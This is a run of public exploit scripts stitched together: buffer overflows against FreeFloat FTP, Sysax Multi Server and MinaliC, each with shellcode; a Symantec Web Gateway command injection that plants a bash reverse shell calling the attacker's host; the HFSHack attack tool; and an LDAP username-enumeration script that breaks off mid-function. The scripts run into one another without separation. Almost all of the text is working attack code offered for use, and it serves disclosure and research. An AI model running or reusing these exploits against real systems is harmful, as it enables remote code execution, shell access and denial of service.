#[+]Exploit Title: FreeFloat FTP Server REST and PASV Buffer Overflow Exploit
#[+]Date: 18\06\2011
#[+]Author: C4SS!0 G0M3S
#[+]Software Link: http://www.freefloat.com/software/freefloatftpserver.zip
#[+]Version: 1.00
#[+]Tested On: Windows XP SP3 Brazilian Portuguese
#[+]CVE: N/A
#
#

import errno
from os import strerror
from socket import *
import sys
from time import sleep
from struct import pack

if len(sys.argv) != 3:
	print "[-]Usage: python %s <ip> <port>" % sys.argv[0]
	print "[-]Exemple: python %s 192.168.1.2 21" % sys.argv[0]
	sys.exit(0)
ip = sys.argv[1]
port = int(sys.argv[2])

shellcode = ("\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1"
"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30"
"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa"
"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96"#Shellcode WinExec CALC
"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b"#Know badchars "\x00\xff\x0d\x0a\x3d\x20"
"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a"
"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83"
"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98"
"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61"
"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05"
"\x7f\xe8\x7b\xca")
buf = "\x41" * 246
buf += pack('<L',0x7C91FCD8)#JMP ESP in ntdll.dll
buf += "\x90" * 20
buf += shellcode

print "[+]Connecting with server..."
sleep(1)
try:
	s = socket(AF_INET,SOCK_STREAM)
	s.connect((ip,port))
	s.recv(2000)
	s.send("USER test\r\n")
	s.recv(2000)
	s.send("PASS test\r\n")
	s.recv(2000)
	s.send("REST "+buf+"\r\n")
	s.close()
	s = socket(AF_INET,SOCK_STREAM)
	s.connect((ip,port))#Server needs connect AGAIN to CRASH and ocorrs the buffer overflow bug.
	sleep(1)#Wait a segund
	s.close()#Close connection CRASH
	print "[+]Exploit sent with sucess"
except:
	print "[*]Error in connection with server: "+ip#!/usr/bin/python
##########################################################################################################
#Title: Sysax Multi Server <= 5.52 File Rename BoF RCE (Egghunter)
#Author: Craig Freyman (@cd1zz)
#Tested on: XP SP3 32bit and Server 2003 SP2 32bit(No DEP)
#Software Versions Tested: 5.50 and 5.52
#Date Discovered: Febrary 1, 2012
#Vendor Contacted: Febrary 3, 2012
#Vendor Response: (none)
#A complete description of this exploit can be found here:
#http://www.pwnag3.com/2012/02/sysax-multi-server-552-file-rename.html
##########################################################################################################

import socket,sys,time,re,base64

if len(sys.argv) != 6:
    print "[+] Usage: ./filename <Target IP> <Port> <User> <Password> <XP or 2K3>"
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])
user = sys.argv[3]
password = sys.argv[4]
opersys = sys.argv[5]

#base64 encode the provided creds
creds = base64.encodestring(user+"\x0a"+password)

#msfpayload  windows/shell_bind_tcp LPORT=4444 R|msfencode -e x86/alpha_mixed -b "\x00\x2f\x0a" 
shell = ("DNWPDNWP"
"\x89\xe3\xda\xc5\xd9\x73\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x4a"
"\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37\x52\x59"
"\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41"
"\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42"
"\x75\x4a\x49\x39\x6c\x58\x68\x6d\x59\x55\x50\x65\x50\x45"
"\x50\x55\x30\x4e\x69\x39\x75\x55\x61\x39\x42\x61\x74\x4c"
"\x4b\x51\x42\x50\x30\x6e\x6b\x73\x62\x36\x6c\x6e\x6b\x63"
"\x62\x57\x64\x6c\x4b\x53\x42\x55\x78\x66\x6f\x6d\x67\x73"
"\x7a\x37\x56\x45\x61\x4b\x4f\x45\x61\x6f\x30\x4c\x6c\x65"
"\x6c\x61\x71\x33\x4c\x75\x52\x64\x6c\x45\x70\x79\x51\x38"
"\x4f\x66\x6d\x63\x31\x58\x47\x7a\x42\x68\x70\x73\x62\x71"
"\x47\x6c\x4b\x33\x62\x32\x30\x4c\x4b\x77\x32\x55\x6c\x36"
"\x61\x58\x50\x6e\x6b\x71\x50\x62\x58\x6e\x65\x4b\x70\x33"
"\x44\x61\x5a\x77\x71\x68\x50\x72\x70\x4c\x4b\x33\x78\x36"
"\x78\x6e\x6b\x70\x58\x71\x30\x57\x71\x59\x43\x79\x73\x75"
"\x6c\x43\x79\x6e\x6b\x34\x74\x6c\x4b\x47\x71\x6e\x36\x55"
"\x61\x49\x6f\x56\x51\x6f\x30\x4c\x6c\x49\x51\x68\x4f\x34"
"\x4d\x33\x31\x49\x57\x64\x78\x69\x70\x30\x75\x38\x74\x75"
"\x53\x53\x4d\x6b\x48\x37\x4b\x71\x6d\x51\x34\x52\x55\x6a"
"\x42\x33\x68\x4e\x6b\x42\x78\x75\x74\x43\x31\x6e\x33\x62"
"\x46\x6e\x6b\x66\x6c\x32\x6b\x4e\x6b\x76\x38\x47\x6c\x77"
"\x71\x68\x53\x4e\x6b\x65\x54\x4c\x4b\x57\x71\x78\x50\x4f"
"\x79\x67\x34\x51\x34\x51\x34\x63\x6b\x61\x4b\x65\x31\x30"
"\x59\x30\x5a\x53\x61\x39\x6f\x6d\x30\x33\x68\x31\x4f\x52"
"\x7a\x6c\x4b\x65\x42\x68\x6b\x4c\x46\x63\x6d\x55\x38\x44"
"\x73\x46\x52\x63\x30\x33\x30\x35\x38\x42\x57\x30\x73\x50"
"\x32\x73\x6f\x50\x54\x31\x78\x52\x6c\x34\x37\x44\x66\x44"
"\x47\x59\x6f\x6e\x35\x6e\x58\x6e\x70\x77\x71\x55\x50\x55"
"\x50\x46\x49\x49\x54\x46\x34\x42\x70\x61\x78\x51\x39\x6f"
"\x70\x50\x6b\x53\x30\x59\x6f\x49\x45\x50\x50\x50\x50\x36"
"\x30\x72\x70\x51\x50\x32\x70\x57\x30\x72\x70\x43\x58\x38"
"\x6a\x34\x4f\x79\x4f\x6b\x50\x79\x6f\x39\x45\x6d\x59\x79"
"\x57\x50\x31\x49\x4b\x51\x43\x65\x38\x43\x32\x45\x50\x72"
"\x31\x73\x6c\x6c\x49\x49\x76\x32\x4a\x34\x50\x76\x36\x72"
"\x77\x45\x38\x5a\x62\x4b\x6b\x55\x67\x63\x57\x79\x6f\x38"
"\x55\x71\x43\x51\x47\x43\x58\x4f\x47\x59\x79\x64\x78\x69"
"\x6f\x59\x6f\x7a\x75\x36\x33\x70\x53\x51\x47\x65\x38\x61"
"\x64\x78\x6c\x67\x4b\x69\x71\x49\x6f\x48\x55\x70\x57\x6f"
"\x79\x49\x57\x63\x58\x42\x55\x50\x6e\x72\x6d\x55\x31\x79"
"\x6f\x39\x45\x33\x58\x63\x53\x72\x4d\x35\x34\x77\x70\x4e"
"\x69\x79\x73\x76\x37\x73\x67\x62\x77\x46\x51\x7a\x56\x31"
"\x7a\x57\x62\x76\x39\x46\x36\x4b\x52\x39\x6d\x42\x46\x38"
"\x47\x62\x64\x61\x34\x47\x4c\x45\x51\x57\x71\x4c\x4d\x47"
"\x34\x76\x44\x44\x50\x79\x56\x63\x30\x53\x74\x33\x64\x70"
"\x50\x53\x66\x42\x76\x52\x76\x53\x76\x76\x36\x30\x4e\x71"
"\x46\x32\x76\x36\x33\x62\x76\x53\x58\x44\x39\x48\x4c\x57"
"\x4f\x6e\x66\x69\x6f\x79\x45\x6f\x79\x6d\x30\x30\x4e\x32"
"\x76\x63\x76\x49\x6f\x56\x50\x42\x48\x65\x58\x6d\x57\x45"
"\x4d\x31\x70\x79\x6f\x38\x55\x4d\x6b\x78\x70\x4d\x65\x69"
"\x32\x30\x56\x50\x68\x4f\x56\x4a\x35\x4d\x6d\x6f\x6d\x49"
"\x6f\x39\x45\x55\x6c\x66\x66\x43\x4c\x56\x6a\x4d\x50\x69"
"\x6b\x59\x70\x64\x35\x74\x45\x6f\x4b\x53\x77\x55\x43\x43"
"\x42\x42\x4f\x43\x5a\x55\x50\x52\x73\x79\x6f\x68\x55\x41"
"\x41")

egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x44\x4e\x57\x50\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
 
print "============================================================================"
print "                 Sysax Multi Server <= 5.52 File Rename BoF                    "
print "                                  by cd1zz                                   "
print "                               www.pwnag3.com                                "
print "         Launching exploit against " + target + " on port " + str(port) + " for " + opersys
print "============================================================================"

#login with encoded creds
login = "POST /scgi?sid=0&pid=dologin HTTP/1.1\r\n"
login += "Host: \r\n"
login += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:9.0.1) Gecko/20100101 Firefox/9.0.1\r\n"
login += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
login += "Accept-Language: en-us,en;q=0.5\r\n"
login += "Accept-Encoding: gzip, deflate\r\n"
login += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
login += "Proxy-Connection: keep-alive\r\n"
login += "http://"+target+"/scgi?sid=0&pid=dologin\r\n"
login += "Content-Type: application/x-www-form-urlencoded\r\n"
login += "Content-Length: 15\r\n\r\n"
login += "fd="+creds

#grab the sid
r = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
r.connect((target, port))
print "[*] Getting your SID."
r.send(login + "\r\n")
page = r.recv(10240)
sid = re.search(r'sid=[a-zA-Z0-9]{40}',page,re.M)
if sid is None:
	print "[X] Could not get a SID. User and pass correct?"
	sys.exit(1)
print "[+] Your " + sid.group(0)
time.sleep(2)

#find the users path to calc offset
print "[*] Finding home path to calculate offset."
path = re.search(r'file=[a-zA-Z0-9]:\\[\\.a-zA-Z_0-9 ]{1,255}[\\$]',page,re.M)
time.sleep(1)

#if that doesnt work, try to upload a file and check again
if path is None:
	print "[-] There are no files in your path so I'm going to try to upload one for you."
	print "[-] If you don't have rights to do this, it will fail."

	upload = "POST /scgi?"+str(sid.group(0))+"&pid=uploadfile_name1.htm HTTP/1.1\r\n"
	upload += "Host:\r\n"
	upload += "Content-Type: multipart/form-data; boundary=---------------------------97336096252362005297691620\r\n"
	upload += "Content-Length: 219\r\n\r\n"
	upload += "-----------------------------97336096252362005297691620\r\n"
	upload += "Content-Disposition: form-data; name=\"upload_file\"; filename=\"file.txt\"\r\n"
	upload += "Content-Type: text/plain\r\n"
	upload += "-----------------------------97336096252362005297691620--\r\n\r\n"

	u = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	u.connect((target, port))
	u.send(upload + "\r\n")
	page = u.recv(10240)
        path = re.search(r'file=[a-zA-Z0-9]:\\[\\.a-zA-Z_0-9 ]{1,255}[\\$]',page,re.M)
	time.sleep(2)
	if path is None:
		print "[X] It failed, you probably don't have rights to upload."
		print "[X] You will need to get your path another way to properly calculate the offset."
		sys.exit(1)
	
print "[+] Got it ==> " + path.group(0) 
time.sleep(1)

#subtract --> file=c:\ <--- (8 bytes) from the length and minus one more for the trailing --> \
pathlength = len(path.group(0)) - 8 - 1
#print "[*] The path is " + str(pathlength) + " bytes long (not including C:\)."
if pathlength < 16:
	print "[X] Your path is too short, this will just DoS the server."
	print "[X] The path has to be at least 16 bytes long or we cant jump to our buffer."
	sys.exit(1)
time.sleep(2)
r.close()

#jump back 128 bytes
jumpback = "\xeb\x80"

#No DEP bypass
if opersys == "2K3":
	#2043 is the offset for c:\A
	offset = 2044 - pathlength
	padding = "\x90" * 10
	junk = "\x41" * (offset - len(egghunter+padding))
	jump = "\xa4\xde\x8e\x7c" 	#JMP ESP
	buf = junk + egghunter + padding + jump + "\x90"*12 + jumpback + "D"*10
 
if opersys == "XP":
	#2044 is the offset for c:\A 
	offset = 2044 - pathlength
	padding = "\x90" * 10
	junk = "\x41" * (offset - len(egghunter+padding))
	jump = "\x53\x93\x42\x7e" 	#JMP ESP
	buf = junk + egghunter + padding + jump + "\x90"*12 + jumpback + "D"*10

#print "[*] Your offset is " + str(offset)
	
#we'll stuff our shell in memory first
stage1 = "POST /scgi?"+str(sid.group(0))+"&pid="+shell+"mk_folder2_name1.htm HTTP/1.1\r\n"
stage1 += "Host: \r\n"
stage1 += "Referer: http://"+target+"/scgi?sid="+str(sid.group(0))+"&pid=mk_folder1_name1.htm\r\n"
stage1 += "Content-Type: multipart/form-data; boundary=---------------------------1190753071675116720811342231\r\n"
stage1 += "Content-Length: 171\r\n\r\n"
stage1 += "-----------------------------1190753071675116720811342231\r\n"
stage1 += "Content-Disposition: form-data; name=\"e2\"\r\n\r\n"
stage1 += "file_test\r\n"
stage1 += "-----------------------------1190753071675116720811342231--\r\n\r\n"

#this is the bof
stage2 = "POST /scgi?"+str(sid.group(0))+"&pid=rnmslctd1_name1.htm HTTP/1.1\r\n"
stage2 += "Host: \r\n"
stage2 += "Referrer: http://"+target+"/scgi?sid=0&pid=dologin\r\n"
stage2 += "Content-Type: multipart/form-data; boundary=---------------------------332173112583677792048824791\r\n"
stage2 += "Content-Length: 183\r\n\r\n"
stage2 += "-----------------------------332173112583677792048824791\r\n"
stage2 += "Content-Disposition: form-data; name=\"e2\"\r\n\r\n"
stage2 += "file_"+buf+"\r\n\r\n"
stage2 += "-----------------------------332173112583677792048824791--\r\n\r\n"
  
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((target, port))
print "[*] Sending stage 1 shell."
s.send(stage1 + "\r\n")
time.sleep(3)
##Dont close the socket or we'll lose our stage 1 shell in memory
##s.close()

t = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
t.connect((target, port))
print "[*] Sending stage 2 BoF."
t.send(stage2 + "\r\n")
print "[*] Go get your shell..."
t.recv(2048)#!/usr/bin/python
import urllib
import sys

'''

print "[*] ##############################################################"
print "[*] Symantec Web Gateway 5.0.3.18 pbcontrol.php ROOT RCE Exploit"
print "[*] Offensive Security - http://www.offensive-security.com"
print "[*] ##############################################################\n"

# 06 Jun 2012: Vulnerability reported to CERT
# 08 Jun 2012: Response received from CERT with disclosure date set to 20 Jul 2012
# 26 Jun 2012: Email received from Symantec for additional information
# 26 Jun 2012: Additional proofs of concept sent to Symantec
# 06 Jul 2012: Update received from Symantec with intent to fix
# 20 Jul 2012: Symantec patch released: http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120720_00
# 23 Jul 2012: Public Disclosure

'''

if (len(sys.argv) != 4):
        print "[*] Usage: symantec-web-gateway-0day.py <RHOST> <LHOST> <LPORT>"
        exit(0)

rhost = str(sys.argv[1])
lhost = sys.argv[2]
lport = sys.argv[3]

payload= '''echo%20'%23!%2Fbin%2Fbash'%20%3E%20%2Ftmp%2FnetworkScript%3B%20echo%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F'''+lhost+'''%2F'''+lport+'''%200%3E%261'%20%3E%3E%20%2Ftmp%2FnetworkScript%3Bchmod%20755%20%2Ftmp%2FnetworkScript%3B%20sudo%20%2Ftmp%2FnetworkScript'''
url = 'https://%s/spywall/pbcontrol.php?filename=hola";%s;"&stage=0' % (rhost,payload)
urllib.urlopen(url)#!/usr/bin/env python

# Exploit Title: MinaliC Webserver buffer overflow
# Date: 12 Apr 2013
# Exploit Author: superkojiman - http://www.techorganic.com
# Vendor Homepage: http://minalic.sourceforge.net/
# Version: MinaliC Webserver 2.0.0
# Tested on: Windows XP Pro SP2, English
#
# Description: 
# Remote command execution by triggering a buffer overflow in the GET
# request. 
#

import socket
import struct

# 74 bytes calc.exe from http://code.google.com/p/win-exec-calc-shellcode/
shellcode = (
"\x31\xd2\x52\x68\x63\x61\x6c\x63\x89\xe6\x52\x56\x64\x8b\x72" +
"\x30\x8b\x76\x0c\x8b\x76\x0c\xad\x8b\x30\x8b\x7e\x18\x8b\x5f" +
"\x3c\x8b\x5c\x1f\x78\x8b\x74\x1f\x20\x01\xfe\x8b\x4c\x1f\x24" +
"\x01\xf9\x0f\xb7\x2c\x51\x42\xad\x81\x3c\x07\x57\x69\x6e\x45" +
"\x75\xf1\x8b\x74\x1f\x1c\x01\xfe\x03\x3c\xae\xff\xd7\xcc"
)

# EIP at offset 245 when minalic.exe is in C:\minalic\bin 
# EBX points directly to the "Host:" value, so we put our shellcode there. 
# JMP EBX @ 0x7C955B47, NTDLL.DLL, Windows XP Pro SP2 English

# Exploit-DB Note:
# ret = struct.pack("<I", 0x77c11f13)     # jmp ebx msvcrt.dll Windows XP SP3 English

junk = "\x41" * 245
ret = struct.pack("<I", 0x7C955B47)
host = "\x90" * 30 + shellcode + "\x90" * 31

buf = "GET /" + junk + ret + " HTTP/1.1\r\n" + "Host: " + host + "\r\n\r\n"

print "[+] sending buffer size", len(buf)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.37.132", 8080))
s.send(buf)
 
source: http://www.securityfocus.com/bid/27423/info

HFS (HTTP File Server) is prone to multiple security vulnerabilities, including cross-site scripting issues, an information-disclosure issue, an arbitrary file-creation issue, a denial-of-service issue, a username-spoofing issue, and a logfile-forging issue.

A successful exploit could allow an attacker to deny service to legitimate users, create and execute arbitrary files in the context of the webserver process, falsify log information, or execute arbitrary script code in the browser of an unsuspecting user. Other attacks are also possible. 

#!/usr/bin/python

"""
----------------------------------------------------------------
HFSHack 1.0b (By Felipe M. Aragon And Alec Storm )
----------------------------------------------------------------
* CVE-2008-0409 - Cross-Site Scripting (XSS) and Host Field XSS
* CVE-2008-0410 - Information Disclosure Vulnerability
Affected Versions: HFS 2.0 to and including 2.3(Beta Build 174)
http://www.syhunt.com/advisories/hfs-1-template.txt

* CVE-2008-0405 - Arbitrary File/Folder Creation Vulnerability
* CVE-2008-0406 - Denial of Service (DoS) Vulnerability
Affected Versions: HFS 2.2 to and including 2.3(Beta Build 174)
http://www.syhunt.com/advisories/hfs-1-log.txt

* CVE-2008-0407 - Username Spoofing Vulnerability
* CVE-2008-0408 - Log Forging / Injection Vulnerability
Affected Versions: HFS 1.5g to and including 2.3(Beta Build
174); and possibly HFS version 1.5f
http://www.syhunt.com/advisories/hfs-1-username.txt

Vulnerabilities found by Syhunt (http://www.syhunt.com)
Sandcat can also identify these issues:
http://www.syhunt.com/sandcat
"""

import urllib2, sys, re, commands, StringIO, string, base64

host = '127.0.0.1' # Default Host

help = ('\n'
'open [hostname]\n'
'	This should be called first (unless you want the default host)\n\n'
'checkdos\n'
'	Performs the Log DoS Attack (Makes the server crash)\n\n'
'checkxss\n'
'	Checks for the presence of the Template XSS Vulnerability\n\n'
'manipf [localfilename] [remotefilename]\n'
'	Appends content of a local file to a remote file. Examples:\n'
'	manipf inject.html index.html or ..\\..\index.html\n'
'	Note: If the file does not exists, it will be created.\n\n'
'maniplog [localfilename]\n'
'	Injects content of a local file to the HFS log panel and file\n\n'
'mkd [dirname]\n'
'	Creates directories. Examples:\n'
'	mkd Test or ..\\..\\Windows\\Test\n\n'
'symbols\n'
'	Forces HFS to reveal details about the server\n\n'
'ver\n'
'	Forces HFS to show its version and build, and displays which\n\n'
'	HFSHack commands are available for it\n'
'quit\n'
'	Exits this application'
'\r\n')

readme = (
'(c) 2008 Syhunt Security. All rights reserved.\n\n'
'This tool is provided ''as-is'', without any expressed or implied\n'
'warranty. In no event will the author be held liable for any\n'
'damages arising from the use of this tool.\n\n'
'Permission is granted to anyone to use this tool, and to alter\n'
'it and redistribute it freely, subject to the following\n'
'restrictions:\n\n'
'1. The origin of this tool must not be misrepresented, you must\n'
'   not claim that you wrote the original tool.\n\n'
'2. Altered source versions must be plainly marked as such, and\n'
'   must not be misrepresented as being the original plugin.\n\n'
'3. This notice may not be removed or altered from any source\n'
'   distribution.\n\n'
'If you have any questions concerning this license, please email\n'
'contact _at_ syhunt _dot_ com\n'
)

about = (
'----------------------------------------------------------------\n'
' Syhunt HFSHack 1.0b\n'
'----------------------------------------------------------------\n\n'
'This exploit tool should be used only by system administrators\n'
'(or other people in charge).\n\n'
'Type "readme" and read the text before continuing\n\n'
'If you have already read it, type "help" to view a list of\n'
'commands.'
)

# Extra Details to Obtain
symbol_list = (
'connections;Current number of connections to HFS',
'timestamp;Date and time of the server',
'uptime;Uptime',
'speed-out;Current outbound speed',
'speed-in;Current inbound speed',
'total-out;Total amount of bytes sent',
'total-downloads;Total amount of bytes sent',
'total-hits;Total Hits',
'total-uploads;Total Uploads',
'number-addresses;Current number of connected clients (IPs)',
'number-addresses-ever;Number of unique IPs ever connected',
'number-addresses-downloading;Current number of downloading clients (IPs)',
)

# Affected Versions
re_200801161 = '^HFS(.*?)(2.[0-1]|2.2$|2.2[a-b]|2.3 beta)'
re_200801162 = '^HFS(.*?)(2.2$|2.2[a-b]|2.3 beta)'
re_200801163 = '^HFS(.*?)(1.5[f-g]|1.6|2.[0-1]|2.2$|2.2[a-b]|2.3 beta)'
re_cangetver = '^HFS(.*?)(2.[0-1]|2.2$|2.2[a-b])'

# Common Messages
msg_par_mis = 'Parameter(s) missing.'
msg_done = 'Done.\n'
msg_acc_file = 'Error reading local file (file not found):'
msg_help = 'Type "help" to view a list of commands.'
msg_err_con = 'Error Connecting:'
msg_fail = 'Failed.'
msg_req_ok = 'Request accepted.'

uagent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0; Syhunt HFSHack)';
path = '/' # Default Path

def dorequest(hpath,auth_data,s_msg,f_msg):
        globals()["rcvd"] = ''
        globals()["banner"] = ''
	url = 'http://'+host+hpath
	try:
		opener = urllib2.build_opener(url)
		opener.addheaders = [('User-agent', uagent)]
		if auth_data != '':
			opener.addheaders = [('Authorization', 'Basic '+auth_data)]
		globals()["rcvd"] = opener.open(url).readlines()
	        if 'server' in opener.open(url).headers:
			globals()["banner"] = opener.open(url).headers['server']
	except Exception, msg:
		if f_msg != '':
			print f_msg,msg
		return False
	else:
		if s_msg != '':
			print s_msg
		return True

def genbase64str(string):
	base64str = base64.encodestring(string);
        base64str = base64str.replace("\n","")
	return base64str

def readlocalfile(filename):
    file = open(filename, "r")
    text = file.readlines()
    file.close()
    print text
    filecontentstr = ''
    for l in text:
	filecontentstr = filecontentstr+l
    return filecontentstr

def ishostavailable():
	return dorequest(path,'','',msg_err_con)

def getservinfo(symbol,desc):
	base64str = base64.encodestring('<id>%'+symbol+'%</id>');
	if dorequest(path,base64str,'',msg_err_con):
		for l in rcvd:
			hfsver = re.findall('<id>(.*?)</id>', l)
			for r in hfsver:
				if r != []:
					hfsverdec = urllib2.unquote(hfsver[0])
					if desc != '':
						print desc+': '+hfsverdec
					return hfsverdec
	else:
		return ''

def getallservinf():
	for l in symbol_list:
		curl = l.split(';')
		getservinfo(curl[0],curl[1])

def hfsmkdir(dirname):
	base64str = genbase64str('\\..\\'+dirname+'\\')+'AA';
	dorequest(path,base64str,msg_req_ok,msg_fail)

def shutdownhfs():
	dosstr = genbase64str('a' * 270 + ':')
	if dorequest(path,dosstr,msg_fail,'DoS executed.'):
        	dorequest(path,'','Host is still up.','Host is now down.')

def hfsappendtofile(filename,string):
	base64str = genbase64str('\\..\\'+filename)+'AA';
	dorequest('/?%0a'+string,base64str,msg_req_ok,msg_fail)

def hfsinjecttolog(string):
	base64str = genbase64str(string);
	dorequest('/',base64str,msg_req_ok,msg_fail)

def procparams(cmd):
	try:
		if len(cmd) > 0:
			if cmd[1] != []:
				globals()["host"] = cmd[1]
	except:
		print "No target info provided. Using localhost"
	
def checkxss():
	if ishostavailable():
		curver = getservinfo('version','')
		if curver != '':
			return 'XSS Found'
		else:
			return 'Not Vulnerable'
	else:
		return msg_fail

def isbanner(regex):
	p = re.compile(regex)
	m = p.match(banner)
	return m

def showacceptedcmds():
	cmds = 'None (This server is not vulnerable)';
	if isbanner(re_200801161):
		cmds = 'checkxss symbols ver'
	if isbanner(re_200801162):
		cmds = cmds+' manipf mkd checkdos'
	if isbanner(re_200801163):
		cmds = cmds+' maniplog'
	print '\nAvailable commands for this server:'
	print ' '+cmds+'\n'

def showver():
	cangetver = True
	if banner != '':
		server_name = banner.split()
		print banner
		if server_name[0] != 'HFS':
			print 'Not running HFS!'
			cangetver = False
		else:
			if isbanner(re_cangetver):
				print 'Confirming version...'
			else:
				cangetver = False
	else:
		print 'No version information found.'
		print 'The "Send HFS identifier" option is probably disabled.'
		print 'Trying to force HFS to display its version...'
	if cangetver == True:
		idver = getservinfo('version','HFS version number')
		idbuild = getservinfo('build','HFS build number')
		globals()["banner"] = 'HFS '+idver+' '+idbuild
	showacceptedcmds()

def result(s):
	cmd = s.split()
	if len(cmd) > 0:
		curcmd = cmd[0]
		result = 'Invalid command. Type "help" for list of commands.'
		if curcmd == 'open':
			procparams(cmd)
			if ishostavailable():
				showver()
				result = 'Connected.\n'
			else:
				result = msg_fail
		elif curcmd == 'symbols':
			if ishostavailable():
				showver()
				print 'Forcing HFS to reveal more details...'
				getallservinf()
			result = msg_done
		elif curcmd == 'ver':
			if ishostavailable():
				showver()
			result = msg_done
		elif curcmd == 'mkd':
			if len(cmd) > 1:
				if cmd[1] != []:
					hfsmkdir(cmd[1])
				result = msg_done
			else:
				result = msg_par_mis
		elif curcmd == 'manipf':
			if len(cmd) > 2:
				try:
					localfilecontent = readlocalfile(cmd[1])
				except Exception, msg:
					result = msg_acc_file,msg
				else:
        				localfilecontent = localfilecontent.replace("\n","%0a")
					hfsappendtofile(cmd[2],localfilecontent)
					result = msg_done
			else:
				result = msg_par_mis
		elif curcmd == 'maniplog':
			if len(cmd) > 1:
				try:
					localfilecontent = readlocalfile(cmd[1])
				except Exception, msg:
					result = msg_acc_file,msg
				else:
					hfsinjecttolog(localfilecontent)
					result = msg_done
			else:
				result = msg_par_mis
		elif curcmd == 'checkdos':
			shutdownhfs()
			result = msg_done
		elif curcmd == 'checkxss':
			result = checkxss()
		elif curcmd == 'help':
			result = help
		elif curcmd == 'readme':
			result = readme
		elif curcmd == 'quit':
			result = 'Bye!'
		return result
	else:
		return msg_help

print about

s = ""
while s != "quit":
	try: s = raw_input(">")
	except EOFError:
		s = "quit"
		print s
	print result(s)
        
source: http://www.securityfocus.com/bid/32305/info

Microsoft Active Directory is prone to a username-enumeration weakness because of a design error in the application when verifying user-supplied input.

Attackers may exploit this weakness to discern valid usernames. This may aid them in brute-force password cracking or other attacks.

This issue affects Active Directory on these versions of Windows:

Windows 2000 SP4
Windows Server 2003 SP1 and SP2

Other versions may also be affected. 

#!/usr/bin/env python

'''
Microsoft Windows Active Directory LDAP Server Information
Disclosure Vulnerability Exploit
(c) 2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>

License: GPLv2

Version: 0.1

References:
* http://labs.portcullis.co.uk/application/ldapuserenum/
* http://www.portcullis-security.com/40.php

Successfully tested on:
* Microsoft 2000 Server Service Pack 4 + Update Rollup 1 Full Patched at
  October 2008
* Microsoft 2003 Standard Service Pack 2 Full Patched at October 2008
'''


import os
import re
import sys
import traceback

try:
    import ldap
except:
    print 'ERROR: this tool requires python-ldap library to be installed, get it '
    print 'from http://python-ldap.sourceforge.net/ or apt-get install python-ldap'
    sys.exit(1)

from optparse import OptionError
from optparse import OptionParser


def LDAPconnect(target, port=389, version=ldap.VERSION3):
    try:
        # Connect to the remote LDAP server
        l = ldap.open(target, port)

        # Set the LDAP protocol version
        l.protocol_version = version
    except:
        print 'ERROR: unable to connect to the remote LDAP server'

    return l


def LDAPinfo(target, info=False):
    # Connect to the remote LDAP server
    l = LDAPconnect(target)

    # Retrieved machine domain
    domain = None

    # Set search requirements and directory
    baseDN = ''
    searchScope = ldap.SCOPE_BASE
    resultSet = []

    # Retrieve all LDAP attributes
    retrieveAttributes = None 
    searchFilter = 'objectClass=*'

    try:
        # Get LDAP information
        ldapResultId = l.search(baseDN, searchScope, searchFilter, retrieveAttributes)
    except ldap.SERVER_DOWN, _:
        print 'ERROR: unable to connect to the remote LDAP server'
        return domain

    while True:
        resultType, resultData = l.result(ldapResultId, 0)

        if not resultData:
            break
        elif resultType == ldap.RES_SEARCH_ENTRY:
            resultSet.append(resultData)

    results = resultSet[0][0][1]

    if results:
        if info:
            print '\n[*] LDAP information:'
    else:
        print 'Unable to perform LDAP information gathering, probably anonymous LDAP bind is forbidden'

        domain = raw_input('Please, provide the machine domain yourself: ')

        return domain

    # Print LDAP information
    for key, values in results.items():
        if info:
            print '\t[*] %s' % key

        for value in values:
            if info:
                print '\t\t[*] %s' % value

            domainRegExp = re.search('DC=([\w\.]+)', value, re.I)

            if domainRegExp:
                domain = domainRegExp.group(1)

    print

    return domain


def LDAPusersEnum(target, domain):
    # Enumerated users
    users = {}

    # Path to users list
    usersFilePath = './users.txt'
    
    # Active Directory LDAP bind errors
    # Source: http://www-01.ibm.com/support/docview.wss?rs=688&uid=swg21290631
    errorCodes = {
                   #'525': 'user not found',
                   '52e': 'invalid credentials',
                   '530': 'not permitted to logon at this time',
                   '531': 'not permitted to logon at this workstation',
                   '532': 'password expired',
                   '533': 'account disabled',
                   '701': 'account expired',
                   '773': 'user must reset password',
                   '775': 'user account locked',
                 }

    # Check if users list exists
    if not os.path.exists(usersFilePath):
        print 'ERROR: users list file %s not found' % usersFilePath
        return

    print 'Going to enumerate users taking \'%s\' file as input\n' % usersFilePath

    # Load users from a text file
